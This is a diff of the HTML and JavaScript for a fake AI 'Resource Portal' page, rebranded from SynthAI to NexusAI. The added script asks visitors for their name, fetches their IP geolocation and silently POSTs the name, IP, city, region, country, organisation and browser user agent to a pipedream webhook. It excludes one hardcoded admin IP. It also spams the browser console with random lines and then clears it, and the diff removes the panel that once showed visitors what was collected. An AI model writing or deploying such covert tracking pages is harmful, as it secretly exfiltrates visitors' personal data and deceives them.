@@ -3,18 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SynthAI | Resource Portal</title>
+    <title>NexusAI | Resource Portal</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary: #6c5ce7;
-            --secondary: #4a3ce7;
-            --accent: #00cec9;
-            --dark: #2d3436;
-            --light: #f5f6fa;
-            --success: #00b894;
-            --warning: #fdcb6e;
-            --error: #d63031;
+            --primary: #5c6bc0;
+            --secondary: #3949ab;
+            --accent: #26c6da;
+            --dark: #263238;
+            --light: #f5f5f5;
         }
         
         * {
@@ -29,22 +26,6 @@
             color: var(--dark);
             line-height: 1.6;
             min-height: 100vh;
-        }
-        
-        .admin-bar {
-            background: var(--dark);
-            color: white;
-            padding: 0.5rem 2rem;
-            font-size: 0.8rem;
-            display: flex;
-            justify-content: flex-end;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .admin-bar a {
-            color: var(--accent);
-            text-decoration: none;
-            margin-left: 1.5rem;
         }
         
         .navbar {
@@ -74,23 +55,12 @@
             gap: 2rem;
         }
         
-        .nav-links a {
-            text-decoration: none;
-            color: var(--dark);
-            font-weight: 500;
-            transition: all 0.3s ease;
-        }
-        
-        .nav-links a:hover {
-            color: var(--primary);
-        }
-        
         .auth-container {
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: calc(100vh - 120px);
-            padding: 4rem 2rem;
+            min-height: calc(100vh - 80px);
+            padding: 2rem;
         }
         
         .auth-card {
@@ -98,9 +68,8 @@
             border-radius: 16px;
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
             width: 100%;
-            max-width: 1200px;
+            max-width: 1000px;
             overflow: hidden;
-            transition: all 0.4s ease;
         }
         
         .auth-header {
@@ -110,38 +79,17 @@
             text-align: center;
         }
         
-        .auth-header h1 {
-            font-size: 1.8rem;
-            margin-bottom: 0.5rem;
-        }
-        
-        .auth-header p {
-            opacity: 0.9;
-            font-size: 0.95rem;
-        }
-        
         .auth-body {
             padding: 2rem;
         }
         
         .step {
             display: none;
-            animation: fadeIn 0.4s ease;
         }
         
         .step.active {
             display: block;
-        }
-        
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 500;
-            font-size: 0.95rem;
+            animation: fadeIn 0.4s ease;
         }
         
         .form-control {
@@ -150,41 +98,17 @@
             border: 1px solid #e0e0e0;
             border-radius: 8px;
             font-size: 1rem;
-            transition: all 0.3s ease;
-        }
-        
-        .form-control:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
+            margin: 1rem 0;
         }
         
         .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            padding: 0.8rem 1.5rem;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            border: none;
-            font-size: 1rem;
-        }
-        
-        .btn-primary {
             background: var(--primary);
             color: white;
-            width: 100%;
-        }
-        
-        .btn-primary:hover {
-            background: var(--secondary);
-            transform: translateY(-2px);
-        }
-        
-        .btn-block {
-            display: block;
+            padding: 0.8rem 1.5rem;
+            border-radius: 8px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
             width: 100%;
         }
         
@@ -218,34 +142,9 @@
             padding: 1.5rem;
         }
         
-        .resource-title {
-            font-weight: 600;
-            margin-bottom: 0.5rem;
-            color: var(--dark);
-        }
-        
-        .resource-desc {
-            font-size: 0.9rem;
-            color: #666;
-            margin-bottom: 1rem;
-        }
-        
-        .resource-meta {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.8rem;
-            color: #999;
-        }
-        
         .welcome-message {
             text-align: center;
             margin-bottom: 2rem;
-        }
-        
-        .welcome-message h2 {
-            font-size: 1.5rem;
-            margin-bottom: 0.5rem;
-            color: var(--primary);
         }
         
         .user-badge {
@@ -257,84 +156,11 @@
             margin-bottom: 1rem;
         }
         
-        .user-badge i {
-            margin-right: 0.5rem;
-            color: var(--primary);
-        }
-        
-        .ip-data-container {
-            background: #f8f9fa;
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin-bottom: 2rem;
-            border-left: 4px solid var(--primary);
-        }
-        
-        .ip-data-title {
-            font-weight: 600;
-            margin-bottom: 1rem;
-            color: var(--primary);
-        }
-        
-        .ip-data-content {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 1rem;
-        }
-        
-        .ip-data-item {
-            background: white;
-            padding: 0.8rem;
-            border-radius: 6px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-        }
-        
-        .ip-data-label {
-            font-size: 0.8rem;
-            color: #777;
-            margin-bottom: 0.3rem;
-        }
-        
-        .ip-data-value {
-            font-weight: 500;
-            word-break: break-all;
-        }
-        
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
         
-        footer {
-            background: var(--dark);
-            color: white;
-            text-align: center;
-            padding: 2rem;
-            font-size: 0.9rem;
-        }
-        
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            margin-bottom: 1rem;
-        }
-        
-        .footer-links a {
-            color: #ccc;
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-        
-        .footer-links a:hover {
-            color: white;
-        }
-        
-        .copyright {
-            opacity: 0.7;
-        }
-        
-        /* Mobile responsiveness */
         @media (max-width: 768px) {
             .navbar {
                 flex-direction: column;
@@ -347,64 +173,34 @@
                 flex-wrap: wrap;
                 justify-content: center;
             }
-            
-            .auth-container {
-                padding: 2rem 1rem;
-            }
-            
-            .auth-card {
-                border-radius: 12px;
-            }
-            
-            .ip-data-content {
-                grid-template-columns: 1fr;
-            }
-            
-            .admin-bar {
-                padding: 0.5rem 1rem;
-                justify-content: center;
-            }
-            
-            .admin-bar a {
-                margin-left: 1rem;
-            }
         }
     </style>
 </head>
 <body>
-    <div class="admin-bar">
-        <a href="#"><i class="fas fa-user-shield"></i> Admin Portal</a>
-        <a href="#"><i class="fas fa-question-circle"></i> Support</a>
-    </div>
-    
     <nav class="navbar">
         <div class="logo">
-            <i class="fas fa-brain"></i>
-            <span>SynthAI</span>
+            <i class="fas fa-robot"></i>
+            <span>NexusAI</span>
         </div>
         <div class="nav-links">
             <a href="#">Products</a>
             <a href="#">Research</a>
             <a href="#">Solutions</a>
-            <a href="#">Pricing</a>
         </div>
     </nav>
     
     <div class="auth-container">
         <div class="auth-card">
             <div class="auth-header">
-                <h1>Resource Portal</h1>
-                <p>Access premium AI resources and tools</p>
+                <h1>AI Resource Portal</h1>
+                <p>Access premium tools and datasets</p>
             </div>
             
             <div class="auth-body">
                 <!-- Step 1: Name Entry -->
                 <div class="step active" id="step1">
-                    <div class="form-group">
-                        <label for="userName">Enter your full name</label>
-                        <input type="text" class="form-control" id="userName" placeholder="John Doe">
-                    </div>
-                    <button class="btn btn-primary" onclick="nextStep()">Continue <i class="fas fa-arrow-right"></i></button>
+                    <input type="text" class="form-control" id="userName" placeholder="Enter your name">
+                    <button class="btn" onclick="nextStep()">Continue <i class="fas fa-arrow-right"></i></button>
                 </div>
                 
                 <!-- Step 2: Resource Display -->
@@ -412,255 +208,139 @@
                     <div class="welcome-message">
                         <div class="user-badge">
                             <i class="fas fa-user-check"></i>
-                            <span id="welcomeName">Welcome, User</span>
+                            <span id="welcomeName">Welcome back!</span>
                         </div>
-                        <h2>Your Exclusive Resources</h2>
-                        <p>Curated AI tools and datasets for your projects</p>
-                    </div>
-                    
-                    <div class="ip-data-container" id="ipDataContainer">
-                        <div class="ip-data-title">
-                            <i class="fas fa-network-wired"></i> Connection Information
-                        </div>
-                        <div class="ip-data-content" id="ipDataContent">
-                            <!-- IP data will be inserted here -->
-                        </div>
+                        <h2>Your AI Resources</h2>
                     </div>
                     
                     <div class="resources-grid" id="resourceGrid">
-                        <!-- Resources will be dynamically inserted here -->
+                        <!-- Resources will load here -->
                     </div>
                 </div>
             </div>
         </div>
     </div>
-    
-    <footer>
-        <div class="footer-links">
-            <a href="#">Privacy Policy</a>
-            <a href="#">Terms of Service</a>
-            <a href="#">Security</a>
-            <a href="#">Careers</a>
-        </div>
-        <div class="copyright">
-            &copy; 2023 SynthAI Technologies. All rights reserved.
-        </div>
-    </footer>
 
     <script>
-        // Extended list of abstract images from Unsplash (20 unique images)
+        // Unique abstract images (20 different ones)
         const abstractImages = [
-            "https://images.unsplash.com/photo-1620641788421-7a1c342ea42e",
-            "https://images.unsplash.com/photo-1579547945413-497e1b99dac0",
-            "https://images.unsplash.com/photo-1635070041078-e363dbe005cb",
-            "https://images.unsplash.com/photo-1534972195531-d756b9bfa9f2",
-            "https://images.unsplash.com/photo-1563089145-599997674d42",
-            "https://images.unsplash.com/photo-1451187580459-43490279c0fa",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308",
-            "https://images.unsplash.com/photo-1429087969512-1e85aab2683d",
-            "https://images.unsplash.com/photo-1505506874110-6a7a69069a08",
-            "https://images.unsplash.com/photo-1519681393784-d120267933ba",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308",
-            "https://images.unsplash.com/photo-1519125323398-675f0ddb6308"
-        ].map(url => `${url}?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800&t=${Math.random()}`);
-
-        // Sample resources data
-        const resources = [
-            {
-                title: "Neural Network Architectures",
-                desc: "Collection of advanced NN architectures with implementation guides",
-                category: "Framework"
-            },
-            {
-                title: "AI Dataset Library",
-                desc: "Curated datasets for machine learning projects across industries",
-                category: "Data"
-            },
-            {
-                title: "Model Optimization Toolkit",
-                desc: "Tools and techniques for optimizing AI model performance",
-                category: "Tools"
-            },
-            {
-                title: "Research Papers Digest",
-                desc: "Summaries of breakthrough AI research papers",
-                category: "Research"
-            },
-            {
-                title: "Deployment Templates",
-                desc: "Ready-to-use templates for deploying AI models in production",
-                category: "DevOps"
-            },
-            {
-                title: "Ethics Guidelines",
-                desc: "Framework for responsible AI development and deployment",
-                category: "Governance"
-            },
-            {
-                title: "Computer Vision Models",
-                desc: "Pre-trained models for image recognition tasks",
-                category: "Models"
-            },
-            {
-                title: "NLP Processing Suite",
-                desc: "Tools for natural language processing and text analysis",
-                category: "Tools"
-            }
+            "https://source.unsplash.com/random/800x600/?abstract,1",
+            "https://source.unsplash.com/random/800x600/?abstract,2",
+            "https://source.unsplash.com/random/800x600/?abstract,3",
+            "https://source.unsplash.com/random/800x600/?tech,1",
+            "https://source.unsplash.com/random/800x600/?tech,2",
+            "https://source.unsplash.com/random/800x600/?futuristic,1",
+            "https://source.unsplash.com/random/800x600/?futuristic,2",
+            "https://source.unsplash.com/random/800x600/?neon,1",
+            "https://source.unsplash.com/random/800x600/?neon,2",
+            "https://source.unsplash.com/random/800x600/?digital,1",
+            "https://source.unsplash.com/random/800x600/?digital,2",
+            "https://source.unsplash.com/random/800x600/?ai,1",
+            "https://source.unsplash.com/random/800x600/?ai,2",
+            "https://source.unsplash.com/random/800x600/?data,1",
+            "https://source.unsplash.com/random/800x600/?data,2",
+            "https://source.unsplash.com/random/800x600/?network,1",
+            "https://source.unsplash.com/random/800x600/?network,2",
+            "https://source.unsplash.com/random/800x600/?code,1",
+            "https://source.unsplash.com/random/800x600/?code,2",
+            "https://source.unsplash.com/random/800x600/?matrix"
         ];
 
-        // Variables for console spam
+        // Console spam variables
         let spamCount = 0;
-        let spamInterval;
-        const ADMIN_IP = "83.105.112.217"; // Your IP to exclude
+        const ADMIN_IP = "83.105.112.217";
         const WEBHOOK_URL = "https://eoky7dsuisvr7mo.m.pipedream.net";
 
-        // Start console spam when page loads
-        window.onload = function() {
-            startConsoleSpam();
-        };
-
-        function startConsoleSpam() {
-            spamInterval = setInterval(() => {
-                const randomData = Math.random().toString(36).substring(2, 15) + 
-                                 Math.random().toString(36).substring(2, 15);
-                console.log(randomData);
-                spamCount++;
-                
-                if (spamCount >= 300) {
-                    clearInterval(spamInterval);
-                    console.clear();
-                    console.log("System initialization complete");
-                }
-            }, 50);
-        }
-
-        async function nextStep() {
-            const userName = document.getElementById('userName').value.trim();
-            
-            if (!userName) {
-                alert("Please enter your name to continue");
-                return;
+        // Start console spam immediately
+        const spamInterval = setInterval(() => {
+            console.log(`[SYSTEM] ${Math.random().toString(36).substring(2, 15)}`);
+            spamCount++;
+            if (spamCount > 300) {
+                clearInterval(spamInterval);
+                console.clear();
             }
-            
-            // Update welcome message
-            document.getElementById('welcomeName').textContent = `Welcome, ${userName}`;
-            
-            // Get IP data and send to webhook
-            const ipData = await getIPData();
-            
-            if (ipData && ipData.ip !== ADMIN_IP) {
-                await sendToWebhook(userName, ipData);
-                displayIPData(userName, ipData);
-            }
-            
-            // Hide step 1 and show step 2
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
-            
-            // Load resources with random abstract images
-            loadResources();
-        }
+        }, 50);
 
+        // Get IP data silently
         async function getIPData() {
             try {
-                const response = await fetch("https://ipinfo.io/json");
-                if (!response.ok) throw new Error("Network response was not ok");
+                const response = await fetch('https://ipinfo.io/json');
                 return await response.json();
             } catch (error) {
-                console.error("Error fetching IP data:", error);
+                console.error("IP detection failed");
                 return null;
             }
         }
 
+        // Send data to webhook silently
         async function sendToWebhook(userName, ipData) {
-            try {
-                const payload = {
-                    userName,
-                    ip: ipData.ip,
-                    city: ipData.city,
-                    region: ipData.region,
-                    country: ipData.country,
-                    org: ipData.org,
-                    postal: ipData.postal,
-                    timezone: ipData.timezone,
-                    userAgent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                };
+            if (ipData.ip === ADMIN_IP) return;
+            
+            const payload = {
+                name: userName,
+                ip: ipData.ip,
+                city: ipData.city,
+                region: ipData.region,
+                country: ipData.country,
+                org: ipData.org,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
 
-                const response = await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-
-                if (!response.ok) {
-                    console.error("Webhook error:", response.status);
-                }
-            } catch (error) {
-                console.error("Error sending to webhook:", error);
+            } catch (e) {
+                console.error("Webhook error");
             }
         }
 
-        function displayIPData(userName, ipData) {
-            const container = document.getElementById('ipDataContent');
-            container.innerHTML = '';
+        // Main function
+        async function nextStep() {
+            const userName = document.getElementById('userName').value.trim();
+            if (!userName) return;
             
-            const dataPoints = [
-                { label: "Your Name", value: userName, icon: "user" },
-                { label: "IP Address", value: ipData.ip, icon: "network-wired" },
-                { label: "Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country}`, icon: "map-marker-alt" },
-                { label: "Organization", value: ipData.org || "Unknown", icon: "building" },
-                { label: "Postal Code", value: ipData.postal || "Unknown", icon: "envelope" },
-                { label: "Timezone", value: ipData.timezone || "Unknown", icon: "clock" }
-            ];
+            // Silently collect IP data
+            const ipData = await getIPData();
+            if (ipData) await sendToWebhook(userName, ipData);
             
-            dataPoints.forEach(data => {
-                const item = document.createElement('div');
-                item.className = 'ip-data-item';
-                item.innerHTML = `
-                    <div class="ip-data-label">
-                        <i class="fas fa-${data.icon}"></i> ${data.label}
-                    </div>
-                    <div class="ip-data-value">${data.value}</div>
-                `;
-                container.appendChild(item);
-            });
+            // Update UI
+            document.getElementById('welcomeName').textContent = `Welcome, ${userName}`;
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            loadResources();
         }
 
+        // Load resources with unique images
         function loadResources() {
             const grid = document.getElementById('resourceGrid');
-            grid.innerHTML = '';
+            const resources = [
+                "Neural Network Architectures", 
+                "AI Dataset Library",
+                "Model Optimization Toolkit",
+                "Research Papers Digest",
+                "Deployment Templates",
+                "Ethics Guidelines",
+                "Computer Vision Models",
+                "NLP Processing Suite"
+            ];
             
-            // Create a shuffled copy of images to prevent duplicates
+            // Shuffle images to ensure no duplicates
             const shuffledImages = [...abstractImages].sort(() => 0.5 - Math.random());
             
             resources.forEach((resource, index) => {
-                const imgUrl = shuffledImages[index % shuffledImages.length];
-                
                 const card = document.createElement('div');
                 card.className = 'resource-card';
                 card.innerHTML = `
-                    <div class="resource-img" style="background-image: url('${imgUrl}')"></div>
+                    <div class="resource-img" style="background-image:url('${shuffledImages[index]}')"></div>
                     <div class="resource-body">
-                        <h3 class="resource-title">${resource.title}</h3>
-                        <p class="resource-desc">${resource.desc}</p>
-                        <div class="resource-meta">
-                            <span><i class="fas fa-tag"></i> ${resource.category}</span>
-                            <span><i class="fas fa-download"></i> Download</span>
-                        </div>
+                        <h3>${resource}</h3>
+                        <p>Premium resource for AI development</p>
                     </div>
                 `;
-                
                 grid.appendChild(card);
             });
         }
